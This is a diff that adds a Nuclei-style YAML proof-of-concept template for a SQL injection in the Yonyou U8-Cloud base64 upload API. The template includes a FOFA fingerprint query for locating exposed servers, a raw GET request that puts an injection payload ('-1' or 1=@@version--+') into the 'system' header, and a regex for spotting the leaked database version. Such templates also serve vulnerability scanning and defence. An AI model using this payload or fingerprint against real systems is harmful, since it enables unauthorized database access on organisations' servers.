@@ -1,0 +1,43 @@
+id: poc-zam5ibvplvy49zm0
+info:
+  name: 用友NC base64接口 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zam5ibvplvy49zm0'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zam5ibvplvy49zm0
+    fofa: body="UClient.dmg"||app="用友-U8-Cloud"
+http:
+- raw:
+  - 'GET /u8cloud/api/file/upload/base64 HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    system: -1'' or 1=@@version--+
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?nvarchar)(?=.*?3200).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
